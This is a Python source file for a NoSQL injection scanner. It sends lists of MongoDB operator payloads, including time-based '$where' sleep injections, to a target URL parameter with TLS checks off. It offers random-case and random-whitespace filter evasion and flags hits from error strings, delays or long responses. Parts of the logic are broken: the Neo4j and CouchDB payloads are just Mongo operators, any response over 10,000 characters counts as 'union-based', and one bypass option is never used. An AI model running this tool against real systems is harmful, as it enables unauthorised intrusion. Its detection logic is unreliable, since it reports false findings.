import requests
import urllib.parse
import time
import random
import json
from bs4 import BeautifulSoup

class NoSQLInjectionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CONTENT_TYPE": "application/x-www-form-urlencoded",
            "JSON_PAYLOAD": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "URL_ENCODE": True,
            "DB_TYPE": "auto"
        }
        
        self.mongodb_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$where": "return true"},
            {"$where": "return sleep(5000)"},
            {"$or": [{"": ""}, {"": ""}]},
            {"$and": [{"": ""}, {"": ""}]},
            {"$regex": ".*"},
            {"$not": {"$eq": ""}},
            {"$in": [""]},
            {"$nin": [""]},
            {"$exists": True},
            {"$exists": False},
            {"$all": [""]},
            {"$elemMatch": {"": ""}},
            {"$size": 0},
            {"$mod": [0, 1]},
            {"$text": {"$search": ""}}
        ]
        
        self.mongodb_error_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$where": "return true"},
            {"$or": [{"": ""}, {"": ""}]},
            {"$and": [{"": ""}, {"": ""}]},
            {"$regex": ".*"},
            {"$not": {"$eq": ""}},
            {"$in": [""]},
            {"$nin": [""]},
            {"$exists": True},
            {"$exists": False}
        ]
        
        self.mongodb_blind_payloads = [
            {"$where": "return sleep(5000)"},
            {"$where": "function() { return sleep(5000) }"},
            {"$where": "return (function() { return sleep(5000) })()"}
        ]
        
        self.couchdb_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$or": [{"": ""}, {"": ""}]},
            {"$and": [{"": ""}, {"": ""}]},
            {"$regex": ".*"},
            {"$not": {"$eq": ""}},
            {"$in": [""]},
            {"$nin": [""]},
            {"$exists": True},
            {"$exists": False}
        ]
        
        self.neo4j_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$or": [{"": ""}, {"": ""}]},
            {"$and": [{"": ""}, {"": ""}]},
            {"$regex": ".*"},
            {"$not": {"$eq": ""}},
            {"$in": [""]},
            {"$nin": [""]},
            {"$exists": True},
            {"$exists": False}
        ]
        
        self.error_patterns = [
            "MongoError",
            "MongoServerError",
            "MongoDB",
            "BSON",
            "E11000",
            "ns not found",
            "invalid operator",
            "malformed BSON",
            "where clause",
            "syntax error",
            "couchdb",
            "neo4j",
            "query failed",
            "invalid query",
            "parsing error",
            "invalid parameter"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("URL_ENCODE"):
            if isinstance(payload, dict):
                for key in payload:
                    if isinstance(payload[key], str):
                        payload[key] = urllib.parse.quote(payload[key])
            elif isinstance(payload, str):
                payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        if isinstance(payload, dict):
            result = {}
            for key, value in payload.items():
                if isinstance(value, str):
                    result[key] = ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in value)
                else:
                    result[key] = value
            return result
        elif isinstance(payload, str):
            return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
        return payload
    
    def random_space(self, payload):
        if isinstance(payload, dict):
            result = {}
            for key, value in payload.items():
                if isinstance(value, str):
                    result[key] = self.random_space_string(value)
                else:
                    result[key] = value
            return result
        elif isinstance(payload, str):
            return self.random_space_string(payload)
        return payload
    
    def random_space_string(self, s):
        result = []
        for c in s:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '\t', '\n', '\r', '\xa0']))
        return ''.join(result)
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE"),
            "Content-Type": self.get_option("CONTENT_TYPE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        vulnerabilities = []
        
        db_type = self.get_option("DB_TYPE").lower()
        
        if db_type == "auto":
            payloads_to_test = self.mongodb_payloads + self.mongodb_error_payloads + self.mongodb_blind_payloads
        elif db_type == "mongodb":
            payloads_to_test = self.mongodb_payloads + self.mongodb_error_payloads + self.mongodb_blind_payloads
        elif db_type == "couchdb":
            payloads_to_test = self.couchdb_payloads
        elif db_type == "neo4j":
            payloads_to_test = self.neo4j_payloads
        else:
            payloads_to_test = self.mongodb_payloads + self.mongodb_error_payloads + self.mongodb_blind_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers):
        try:
            if method == "GET":
                if self.get_option("JSON_PAYLOAD"):
                    params = {param: payload}
                    test_url = f"{url}?{urllib.parse.urlencode(params)}"
                    response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
                else:
                    if isinstance(payload, dict):
                        json_payload = json.dumps(payload)
                        test_url = f"{url}?{param}={urllib.parse.quote(json_payload)}"
                        response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
                    else:
                        test_url = f"{url}?{param}={payload}"
                        response = requests.get(test_url, timeout=timeout, verify=False, headers=headers)
            else:
                if self.get_option("JSON_PAYLOAD"):
                    if isinstance(payload, dict):
                        data = {param: payload}
                        response = requests.post(url, json=data, timeout=timeout, verify=False, headers=headers)
                    else:
                        data = json.dumps({param: payload})
                        headers["Content-Type"] = "application/json"
                        response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
                else:
                    if isinstance(payload, dict):
                        json_payload = json.dumps(payload)
                        data = {param: json_payload}
                        response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
                    else:
                        data = {param: payload}
                        response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "Error-based NoSQLi"
            
            if len(response.text) > 10000:
                return True, "Union-based NoSQLi (suspected)"
            
        except requests.exceptions.Timeout:
            if isinstance(payload, dict):
                for key, value in payload.items():
                    if isinstance(value, str) and ("sleep" in value.lower() or "wait" in value.lower()):
                        return True, "Time-based NoSQLi"
            elif isinstance(payload, str) and ("sleep" in payload.lower() or "wait" in payload.lower()):
                return True, "Time-based NoSQLi"
        except Exception:
            pass
        
        return False, None
